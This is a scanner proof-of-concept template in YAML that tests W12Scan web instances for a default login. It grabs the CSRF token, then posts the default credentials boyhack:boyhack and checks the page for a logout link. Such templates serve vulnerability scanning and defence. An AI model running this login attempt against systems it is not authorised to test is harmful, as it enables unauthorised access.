name: poc-yaml-w12scan-default-password
rules:
  - method: GET
    path: /user/login
    search: |
      <input type="hidden" name="csrfmiddlewaretoken" value="(?P<token>.+?)"
    expression: |
      response.status == 200 && response.body.bcontains(b"Login") && response.body.bcontains(b"W12Scan")

  - method: POST
    path: /user/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: true
    body: |
      username=boyhack&password=boyhack&csrfmiddlewaretoken={{token}}
    expression: |
      response.status == 200 && response.body.bcontains(b"W12Scan Search Engine For Cybersecurity") && response.body.bcontains(b"user/logout")
detail:
  author: tangshoupu
  info: w12scan-default-password[boyhack:boyhack]
  links:
    - https://github.com/w-digital-scanner/w12scan
